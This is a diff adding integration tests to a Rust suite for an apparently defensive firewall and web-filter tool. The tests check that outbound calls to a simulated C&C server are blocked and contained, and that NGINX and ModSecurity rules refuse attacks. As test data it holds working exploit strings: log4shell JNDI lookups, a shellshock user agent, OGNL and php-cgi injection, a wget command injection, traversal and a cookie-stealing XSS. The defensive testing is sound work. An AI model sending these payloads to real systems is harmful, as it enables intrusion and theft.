@@ -616,7 +616,20 @@ impl Server {
     }
 
     fn spawn(name: &str, network: Option<&str>) -> Server {
+        Server::spawn_with(name, network, &[])
+    }
+
+    /// [`Server::spawn`], with `extra` flags for `run`: the outbound tests
+    /// build a container of their own inside this one, which takes
+    /// `SYS_ADMIN` for its network namespace and forwarding switched on.
+    fn spawn_with(name: &str, network: Option<&str>, extra: &[&str]) -> Server {
         build_image();
+        Server::spawn_from(name, network, extra, image())
+    }
+
+    /// [`Server::spawn_with`] from another image of this suite's, built
+    /// by the caller.
+    fn spawn_from(name: &str, network: Option<&str>, extra: &[&str], image: String) -> Server {
         let name = &scoped(name);
         // Leftover from a previous aborted run.
         let _ = Command::new(runtime()).args(["rm", "-f", name]).output();
@@ -634,7 +647,8 @@ impl Server {
             args.push("--network".to_string());
             args.push(network.to_string());
         }
-        args.push(image());
+        args.extend(extra.iter().map(|arg| arg.to_string()));
+        args.push(image);
         let out = Command::new(runtime())
             .args(&args)
             .output()
@@ -5755,5 +5769,452 @@ fn traefik_uninstall_takes_the_routers_away() {
         traefik.status("test.example", "/", BAD_AGENT),
         "200",
         "uninstall said:\n{said}"
+    );
+}
+
+// ---- outbound traffic to C&C servers, against a real firewall ----
+
+/// The full id the fake runtime gives the container it reports.
+const VICTIM_ID: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
+
+/// The C&C server and an unlisted one, as `server` reaches them: two
+/// addresses in a namespace of their own (see [`with_a_world`]).
+const C2: &str = "198.51.100.7";
+const UNLISTED: &str = "198.51.100.8";
+
+/// The address `server` sends from towards them.
+const SERVER_OUT: &str = "198.51.100.1";
+
+/// A world inside `server`, needing no container network (which rootless
+/// Podman can only build where the kernel's NAT modules are loaded):
+///
+/// - `internet`, a network namespace holding [`C2`] and [`UNLISTED`],
+///   with NGINX answering on both, routed to from the server's own
+///   namespace over a veth pair;
+/// - `victim`, a namespace at 172.30.0.2 behind another veth pair, whose
+///   traffic the server forwards, as a Docker bridge's is: a container;
+/// - a `docker` on `PATH` that knows the container, records every call,
+///   and keeps its paused state in a file: containment's side of a
+///   runtime, without one;
+/// - a user `app`, uid 4242, for the host path.
+///
+/// Entered with `nsenter --net`, never `ip netns exec` or `ip -n`, which
+/// remount `/sys`, and a rootless container refuses that.
+fn with_a_world(server: &Server) {
+    server.sh(&format!(
+        "ip netns add internet && ip netns add victim && \
+         ip link add wi type veth peer name wo && ip link set wo netns internet && \
+         ip addr add {SERVER_OUT}/24 dev wi && ip link set wi up && \
+         nsenter --net=/run/netns/internet ip addr add {C2}/24 dev wo && \
+         nsenter --net=/run/netns/internet ip addr add {UNLISTED}/24 dev wo && \
+         nsenter --net=/run/netns/internet ip link set wo up && nsenter --net=/run/netns/internet ip link set lo up && \
+         nsenter --net=/run/netns/internet ip route add 172.30.0.0/24 via {SERVER_OUT} && \
+         sed 's#^pid .*#pid /run/internet.pid;#' /etc/nginx/nginx.conf > /tmp/internet.conf && \
+         nsenter --net=/run/netns/internet nginx -c /tmp/internet.conf && \
+         ip link add vh type veth peer name vc && ip link set vc netns victim && \
+         ip addr add 172.30.0.1/24 dev vh && ip link set vh up && \
+         nsenter --net=/run/netns/victim ip addr add 172.30.0.2/24 dev vc && \
+         nsenter --net=/run/netns/victim ip link set vc up && nsenter --net=/run/netns/victim ip link set lo up && \
+         nsenter --net=/run/netns/victim ip route add default via 172.30.0.1"
+    ));
+    let fake = format!(
+        r#"#!/bin/sh
+state=/tmp/victim.state
+[ -f $state ] || echo running > $state
+echo "$*" >> /tmp/docker.calls
+case "$1" in
+  ps) echo {VICTIM_ID} ;;
+  inspect)
+    paused=false; [ "$(cat $state)" = paused ] && paused=true
+    printf '[{{"Id":"{VICTIM_ID}","Name":"/victim","State":{{"Running":true,"Paused":%s}},"NetworkSettings":{{"Networks":{{"bridge":{{"IPAddress":"172.30.0.2","GlobalIPv6Address":""}}}}}}}}]' "$paused" ;;
+  pause) echo paused > $state ;;
+  unpause) echo running > $state ;;
+esac
+"#
+    );
+    server.sh(&format!(
+        "cat > /usr/local/bin/docker <<'FAKE'\n{fake}FAKE\nchmod +x /usr/local/bin/docker"
+    ));
+    server.sh("useradd -u 4242 -M app");
+}
+
+/// What a connection from inside `server` to `host`:8080 came to, as
+/// curl's status code: `000` for one that was dropped.
+fn reach(server: &Server, from: &str, host: &str) -> String {
+    let prefix = match from {
+        "root" => "",
+        "app" => "setpriv --reuid=4242 --regid=4242 --clear-groups ",
+        "victim" => "nsenter --net=/run/netns/victim ",
+        other => panic!("no such sender: {other}"),
+    };
+    let (_, stdout, _) = server.run(&format!(
+        "{prefix}curl -s -o /dev/null -w '%{{http_code}}' --max-time 3 http://{host}:8080/"
+    ));
+    stdout.trim().to_string()
+}
+
+/// The kernel log lines the rules write for the two attempts, by hand for
+/// the reason [`port_scan_end_to_end`] gives, with the real addresses.
+fn egress_lines(server: &Server) {
+    let stamp = server.sh("date -u +%Y-%m-%dT%H:%M:%S+00:00");
+    let stamp = stamp.trim();
+    server.sh(&format!(
+        "printf '%s\\n%s\\n' \
+         '{stamp} server kernel: stop-bots-egress: IN=vh OUT=wi SRC=172.30.0.2 DST={C2} LEN=60 \
+         TOS=0x00 PREC=0x00 TTL=63 ID=1 DF PROTO=TCP SPT=40000 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0' \
+         '{stamp} server kernel: stop-bots-egress: IN= OUT=wi SRC={SERVER_OUT} DST={C2} LEN=60 \
+         TOS=0x00 PREC=0x00 TTL=64 ID=2 DF PROTO=TCP SPT=40001 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 \
+         UID=4242 GID=4242' >> /tmp/kern.log"
+    ));
+}
+
+/// The whole of it, for one backend: a C&C feed watched, then blocked,
+/// from the host and from a container; a hit contains both the container
+/// (cut off and paused) and the user, while root and everything else go
+/// on; the containment survives a re-render and a restart of the
+/// container; and releasing it lets both back.
+fn egress_end_to_end(backend: &str) {
+    let server = Server::spawn_with(
+        &format!("stop-bots-egress-{backend}"),
+        None,
+        &["--cap-add=SYS_ADMIN", "--sysctl", "net.ipv4.ip_forward=1"],
+    );
+    with_a_world(&server);
+    server.stop_bots(&format!("set-firewall-backend --backend {backend}"));
+
+    server.sh(&format!("printf '# DstIP\\n{C2}\\n' > /tmp/feodo.txt"));
+    server.stop_bots("set-egress-feed --feed-id feodo --enabled true");
+    server.stop_bots("update-egress-feeds --feed-id feodo --source /tmp/feodo.txt");
+
+    // Watching: logged, and let through.
+    server.stop_bots("set-egress --mode watch");
+    server.render_and_load(backend);
+    for from in ["root", "app", "victim"] {
+        assert_eq!(reach(&server, from, C2), "200", "watching stopped {from}");
+    }
+
+    // Blocking: every sender is stopped at the C&C server, and nowhere else.
+    server.stop_bots("set-egress --mode block");
+    server.render_and_load(backend);
+    let script = server.sh("cat /tmp/fw");
+    for from in ["root", "app", "victim"] {
+        assert_eq!(
+            reach(&server, from, C2),
+            "000",
+            "{from} still reaches the C&C server. script:\n{script}"
+        );
+        assert_eq!(
+            reach(&server, from, UNLISTED),
+            "200",
+            "{from} lost an unlisted server. script:\n{script}"
+        );
+    }
+
+    // A hit contains what made it.
+    server.stop_bots("set-containment --auto true --users true");
+    egress_lines(&server);
+    let said = server.stop_bots("check-egress --kernel-log /tmp/kern.log");
+    for needle in [
+        "ALERT: container victim (172.30.0.2) connected out to",
+        "container victim cut off and paused",
+        "user app (uid 4242) cut off",
+    ] {
+        assert!(said.contains(needle), "no {needle:?} in:\n{said}");
+    }
+    let calls = server.sh("cat /tmp/docker.calls");
+    assert!(
+        calls.contains(&format!("pause {VICTIM_ID}")),
+        "calls:\n{calls}"
+    );
+    let contained = || {
+        [
+            ("the container", reach(&server, "victim", UNLISTED)),
+            ("the user", reach(&server, "app", UNLISTED)),
+        ]
+    };
+    for (what, got) in contained() {
+        assert_eq!(got, "000", "{what} still reaches an unlisted server");
+    }
+    assert_eq!(
+        reach(&server, "root", UNLISTED),
+        "200",
+        "containing them cut off root"
+    );
+
+    // The next script carries it, so a reboot keeps it.
+    server.render_and_load(backend);
+    for (what, got) in contained() {
+        assert_eq!(got, "000", "{what} was let go by a re-render");
+    }
+
+    // A restart brings the container back unpaused; the next pass pauses
+    // it again.
+    server.sh("echo running > /tmp/victim.state");
+    let said = server.stop_bots("check-egress --kernel-log /tmp/kern.log");
+    assert!(
+        said.contains("was running again, paused"),
+        "check said:\n{said}"
+    );
+
+    // Released: both back, and the container unpaused.
+    server.stop_bots("release --all");
+    let calls = server.sh("cat /tmp/docker.calls");
+    assert!(
+        calls.contains(&format!("unpause {VICTIM_ID}")),
+        "calls:\n{calls}"
+    );
+    for from in ["victim", "app"] {
+        assert_eq!(
+            reach(&server, from, UNLISTED),
+            "200",
+            "{from} was not let back after release"
+        );
+    }
+    let listed = server.stop_bots("list-containments");
+    assert!(listed.contains("Nothing is contained."), "{listed}");
+}
+
+#[test]
+fn a_c2_call_is_stopped_and_contained_under_nftables() {
+    if !enabled() {
+        return;
+    }
+    egress_end_to_end("nftables");
+}
+
+#[test]
+fn a_c2_call_is_stopped_and_contained_under_iptables() {
+    if !enabled() {
+        return;
+    }
+    egress_end_to_end("iptables");
+}
+
+// ---- the exploit rules, against a real NGINX ----
+
+/// Every form a payload arrives in is refused before the site answers,
+/// and what people send is served: the rules load into a real NGINX, and
+/// the regexes generated for its PCRE do what the unit tests say they do.
+#[test]
+fn a_real_nginx_turns_away_exploit_payloads_and_serves_everyone_else() {
+    if !enabled() {
+        return;
+    }
+    let server = Server::start("stop-bots-exploits");
+    server.stop_bots("scan-sites --root /etc/nginx/sites-enabled");
+    server.stop_bots("set-exploit-rules --enabled true");
+    server.apply_and_reload();
+
+    let refused = [
+        (
+            "log4shell in the query",
+            "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D",
+            "",
+        ),
+        (
+            "log4shell double-encoded",
+            "/?x=%2524%257Bjndi%253Aldap%257D",
+            "",
+        ),
+        (
+            "log4shell in a header",
+            "/",
+            "-H 'X-Api-Version: ${jndi:ldap://x/a}'",
+        ),
+        (
+            "log4shell in a cookie",
+            "/",
+            "-H 'Cookie: id=${jndi:ldap://x/a}'",
+        ),
+        (
+            "shellshock in the user agent",
+            "/",
+            "-A '() { :; }; /bin/id'",
+        ),
+        (
+            "ognl",
+            "/index.action?r=%25%7B%28%23_memberAccess%29%7D",
+            "",
+        ),
+        (
+            "php-cgi",
+            "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+            "",
+        ),
+        // Encoded here as well as there: `Server::status` hands the path
+        // to a shell, which would run a bare `$(...)` itself.
+        ("command injection", "/?cmd=%24%28wget%20http://x/s%29", ""),
+        (
+            "traversal inside the root",
+            "/a/b/c/.%2e/.%2e/index.html",
+            "",
+        ),
+        // In the query: NGINX refuses one in the path itself, with a 400.
+        ("a nul byte", "/?file=index.html%00.php", ""),
+        ("a cve named", "/", "-A 'scanner CVE-2023-20198'"),
+    ];
+    for (what, path, extra) in refused {
+        assert_eq!(
+            server.status(path, extra),
+            "403",
+            "{what} was served: {path} {extra}"
+        );
+    }
+
+    let served = [
+        ("the home page", "/", ""),
+        ("a search for /etc/passwd", "/?s=/etc/passwd", ""),
+        ("a search for union select", "/?q=union+select", ""),
+        ("a price", "/?amount=%245", ""),
+        (
+            "a browser",
+            "/",
+            "-A 'Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0'",
+        ),
+    ];
+    for (what, path, extra) in served {
+        assert_eq!(
+            server.status(path, extra),
+            "200",
+            "{what} was refused: {path} {extra}"
+        );
+    }
+
+    // An exempt path is let through, as for every rule.
+    server.stop_bots("add-exempt-path --site test.example --path /blog");
+    server.apply_and_reload();
+    assert_ne!(
+        server.status("/blog/?x=%24%7Bjndi%3Aldap%3A%2F%2Fx%7D", ""),
+        "403",
+        "an exempt path was refused"
+    );
+}
+
+// ---- ModSecurity, against a real NGINX with the module ----
+
+fn modsecurity_image() -> String {
+    tagged("stop-bots-modsecurity")
+}
+
+fn build_modsecurity_image() {
+    static ONCE: std::sync::Once = std::sync::Once::new();
+    ONCE.call_once(|| {
+        with_build_lock(|| build_unless_current(&modsecurity_image(), build_modsecurity_image_now))
+    });
+}
+
+fn build_modsecurity_image_now() {
+    let ctx = stage_binary();
+    let out = Command::new(runtime())
+        .args([
+            "build",
+            "-q",
+            "-f",
+            &format!("{ctx}/Dockerfile.modsecurity"),
+            "-t",
+            &modsecurity_image(),
+            &ctx,
+        ])
+        .output()
+        .expect("failed to run the image build");
+    assert!(
+        out.status.success(),
+        "{} build (ModSecurity image) failed:\n{}",
+        runtime(),
+        String::from_utf8_lossy(&out.stderr)
+    );
+}
+
+impl Server {
+    /// Writes what stop-bots has for the sites, and has NGINX test and
+    /// load it.
+    fn apply_and_reload_modsecurity(&self) {
+        self.stop_bots("apply-blocks --root /etc/nginx/sites-enabled --no-reload");
+        let (ok, output) = self.nginx_t();
+        assert!(ok, "the generated config does not load:\n{output}");
+        self.sh("nginx -s reload");
+        std::thread::sleep(std::time::Duration::from_millis(500));
+    }
+}
+
+/// The rule ids ModSecurity found on `site` under `path`, from
+/// `list-modsecurity-findings --json`.
+fn finding_rules(server: &Server, site: &str, path: &str) -> Vec<u64> {
+    let json = server.stop_bots("list-modsecurity-findings --json");
+    let value: serde_json::Value = serde_json::from_str(&json).unwrap_or_else(|err| {
+        panic!("not JSON ({err}):\n{json}");
+    });
+    value["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|f| f["site"] == site && f["path"] == path)
+        .filter_map(|f| f["rule"].as_u64())
+        .collect()
+}
+
+/// Detect logs and serves; block turns the attack away and serves the
+/// rest; the findings, made exclusions, let the same request through; and
+/// a site recognised as Immich has its uploads' bodies left alone, and
+/// only those.
+#[test]
+fn modsecurity_detects_then_blocks_and_learns_its_exclusions() {
+    if !enabled() {
+        return;
+    }
+    build_modsecurity_image();
+    let server = Server::spawn_from("stop-bots-modsecurity", None, &[], modsecurity_image());
+    server.stop_bots("scan-sites --root /etc/nginx/sites-enabled");
+    server.stop_bots("set-modsecurity --mode detect");
+    server.apply_and_reload_modsecurity();
+    let code = |port: u16, extra: &str, path: &str| {
+        let (_, stdout, _) = server.run(&format!(
+            "curl -s -o /dev/null -w '%{{http_code}}' {extra} 'http://127.0.0.1:{port}{path}'"
+        ));
+        stdout.trim().to_string()
+    };
+    let attack_path = "/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E";
+    assert_eq!(code(8080, "", attack_path), "200", "detect mode blocked");
+    let rules = finding_rules(&server, "test.example", "/");
+    assert!(!rules.is_empty(), "detect mode found nothing");
+
+    server.stop_bots("set-modsecurity --site test.example --mode block");
+    server.apply_and_reload_modsecurity();
+    assert_eq!(
+        code(8080, "", attack_path),
+        "403",
+        "block mode served the attack"
+    );
+    assert_eq!(
+        code(8080, "", "/"),
+        "200",
+        "block mode refused the home page"
+    );
+
+    for rule in finding_rules(&server, "test.example", "/") {
+        server.stop_bots(&format!(
+            "exclude-modsecurity-rule --site test.example --rule {rule} --path /"
+        ));
+    }
+    server.apply_and_reload_modsecurity();
+    assert_eq!(
+        code(8080, "", attack_path),
+        "200",
+        "the exclusions made from the findings did not let the request through"
+    );
+
+    server.stop_bots("set-modsecurity --site photos.example --mode block");
+    server.apply_and_reload_modsecurity();
+    let body = "-X POST -H 'Content-Type: application/x-www-form-urlencoded' \
+                --data 'caption=%3Cscript%3Ealert(1)%3C/script%3E'";
+    assert_eq!(
+        code(8081, body, "/api/assets"),
+        "200",
+        "an Immich upload's body was inspected"
+    );
+    assert_eq!(
+        code(8081, body, "/api/albums"),
+        "403",
+        "the same body elsewhere on the site got through"
     );
 }
